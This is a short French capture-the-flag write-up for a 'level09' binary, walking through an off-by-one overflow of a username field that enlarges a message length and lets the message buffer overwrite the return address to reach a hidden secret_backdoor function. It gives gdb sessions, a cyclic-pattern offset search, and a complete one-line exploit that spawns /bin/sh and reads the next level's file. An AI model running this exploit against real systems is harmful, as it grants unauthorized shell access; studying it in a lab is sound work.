Pour cet exo, tout ce qui est interessant ce passe dans la function handle_msg
C'est egalement un programme en 64 bits, donc les addresses sont sur 8 octets
On peut voir une function secret_backdoor, qui permet de faire un system sur une commande qu'on rentre
on a aussi une structure declaree, qui est compose de
    char msg[140];
	char username[40];
	int msglen;
Ensuite, on a une fonction qui permet de rentrer un username, et une autre qui permet de rentrer un message
qui seront stockes dans la structure. La function set_username permet de rentrer un username de 41 caracteres
du coup on peut faire un buffer overflow, et ecraser le bit de poids faible de msglen, qui est un int, et qui est juste apres le username, et lui mettre 255.
Ca nous permettra de faire un overflow sur le msg, et donc de faire un overflow sur le rip, qui pointra sur la fonction puts et la transformer en secret_backdoor
On va donc d'abord chercher l'addresse de la fonction secret_backdoor
(gdb) p secret_backdoor
$1 = {void (void)} 000055555555488c <secret_backdoor>

Ensuite, on va chercher l'offset entre le message et le rip, qui devrait etre apres les 188 de la struture
(gdb) run <<< $(python -c "print 'A'*40 + '\xc9' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'")
Starting program: /home/users/level09/level09 <<< $(python -c "print 'A'*40 + '\xc9' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554a00 in set_username ()

On peut voir que le rip est a 0x0000555555554a00, du coup on a ecrase le bit de poids faible, et on a bien un overflow, et l'offset est de 200

On va donc faire un script python qui va nous permettre de faire un overflow sur le rip, et de le faire pointer sur la fonction secret_backdoor
Sa structure sera comme case

    [padding de 40] + [bit de poids faible de msglen] + "\n" + [padding de 200] + [adresse de secret_backdoor] + "\n"

on a plus qu'a rajouter "/bin/sh" pour avoir un shell et un cat pour laisser le stdin ouvert


Petit plus, on a besoin d'ecrire seulement les 2 derniers bytes de l'addresse car le reste est pareil, et avec un cat on peut voir le dernier fichier end!

{ python -c 'print "A"*40 + "\xca" + "\n" + "A"*200 + "\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; echo "cd ../end && cat end" ;} | ./level09